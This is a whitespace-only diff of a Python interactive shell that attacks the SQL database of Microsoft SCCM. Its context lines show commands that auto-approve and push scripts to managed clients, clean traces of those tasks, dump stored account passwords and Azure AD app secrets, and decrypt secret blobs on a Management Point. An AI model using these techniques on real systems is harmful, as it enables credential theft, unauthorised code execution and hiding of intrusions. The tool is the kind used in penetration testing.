@@ -92,17 +92,17 @@ class SCCM_SQLSHELL(cmd.Cmd):
 
     sccm_ScriptsExecutionStatus [ScriptGuid | TaskID] - Get the output of script executions
     sccm_BGB_Tasks_clean [GUID]                       - Cleans all traces related to a given task
-    
+
     sccm_useraccounts [UserName]                      - List User Accounts (NAA, ClientPush)
     sccm_add_apps [Name]                              - List Azure AD Application configurations
     sccm_decrypt_blob [ResourceID] [HEXBLOB]          - Run script to decrypt secret blob on a Management Point
-    
+
 
     show_ps1_script
     set_ps1_script [Content]
     load_ps1_script [filename]
 
-    
+
     last_task_info          - Print latest task GUIDs
     last_task_output        - Show execution results of the latest Task launched with sccm_run_script
     last_task_output_print  - Pretty print the execution's output
@@ -303,7 +303,7 @@ class SCCM_SQLSHELL(cmd.Cmd):
             if self._clean_scriptstore:
                 logging.info('Prepending clean ScriptStore command to script')
                 script_content = f"{self._clean_scriptstore_cmd.format(guid=script_guid)}\n{script_content}"
-            
+
             script_utf16_hex = hexlify(script_content.encode("utf-16")).decode()
             script_hash = sha256(script_content.encode("utf-16")).hexdigest()
             # ApprovalState = 3 => auto-approve
@@ -380,7 +380,7 @@ class SCCM_SQLSHELL(cmd.Cmd):
             f"WHERE TaskID LIKE '%{filter}%'"
         )
 
-    # BGB_ResTask : inserting a task will trigger 
+    # BGB_ResTask : inserting a task will trigger
     def do_sccm_BGB_ResTasks_add(self, resource_id, task_id):
         self.__run(f"INSERT INTO CM_{self._site_code}..BGB_ResTask " f"VALUES ({resource_id}, 15, {task_id}, N'')")
 
@@ -472,7 +472,7 @@ class SCCM_SQLSHELL(cmd.Cmd):
             logging.error("No Task executed recently")
         else:
             self.do_sccm_ScriptsExecutionStatus(self._last_taskid)
-    
+
     def do_last_task_output_print(self, filter=""):
         if self._last_taskid is None:
             logging.error("No Task executed recently")
@@ -495,17 +495,17 @@ class SCCM_SQLSHELL(cmd.Cmd):
 
     # Credentials
     def do_sccm_useraccounts(self, filter=""):
-        self.__run(f"SELECT top {self._limit} ua.ID, sd.SiteCode, sd.SiteServerName, ua.UserName, ua.Password " 
-                   f"FROM CM_{self._site_code}..SC_UserAccount ua " 
-                   f"LEFT JOIN CM_{self._site_code}..SC_SiteDefinition sd on ua.SiteNumber = sd.SiteNumber " 
+        self.__run(f"SELECT top {self._limit} ua.ID, sd.SiteCode, sd.SiteServerName, ua.UserName, ua.Password "
+                   f"FROM CM_{self._site_code}..SC_UserAccount ua "
+                   f"LEFT JOIN CM_{self._site_code}..SC_SiteDefinition sd on ua.SiteNumber = sd.SiteNumber "
                    f"WHERE ua.UserName LIKE '%{filter}%'")
 
     def do_sccm_aad_apps(self, filter=""):
-        self.__run(f"SELECT top {self._limit} a.ID, t.TenantID, t.Name as TenantName,  a.ClientID, a.Name, a.LastUpdateTime, a.SecretKey, a.SecretKeyForSCP " 
+        self.__run(f"SELECT top {self._limit} a.ID, t.TenantID, t.Name as TenantName,  a.ClientID, a.Name, a.LastUpdateTime, a.SecretKey, a.SecretKeyForSCP "
                    f"FROM CM_{self._site_code}..AAD_Application_Ex  a "
                    f"LEFT JOIN CM_{self._site_code}..AAD_Tenant_Ex  t on t.ID = a.TenantDB_ID "
                     f"WHERE a.Name LIKE '%{filter}%'")
-        
+
     def do_sccm_decrypt_blob(self, line=None):
         if line is None or len(line.split(" ")) < 2 :
             logging.error("Missing arguments, user sccm_decrypt_blob [MP ResourceID] [BLOB] ")
@@ -518,7 +518,7 @@ class SCCM_SQLSHELL(cmd.Cmd):
             if blob.startswith("0C0100"):
                 self._ps1_script_content = self._crypto_decrypt.format(BLOB=blob)
             elif blob.startswith("3082"):
-                self._ps1_script_content = self._crypto_decrypt_useSiteSystemKey.format(BLOB=blob) 
+                self._ps1_script_content = self._crypto_decrypt_useSiteSystemKey.format(BLOB=blob)
             else:
                 logging.error('Unrecognized blob format')
                 return False
@@ -574,7 +574,7 @@ class SCCM_SQLSHELL(cmd.Cmd):
 
     def do_load_ps1_script(self, filename):
         try:
-            self._ps1_script_content = open(filename).read() 
+            self._ps1_script_content = open(filename).read()
             logging.info(f"Loaded script from {filename}")
         except Exception as e:
             logging.error("Failed to load PowerShell script")
@@ -646,7 +646,7 @@ if __name__ == "__main__":
 
     if options.aesKey is not None:
         options.k = True
-    
+
     if options.target_ip is None:
         options.target_ip = remoteName
 
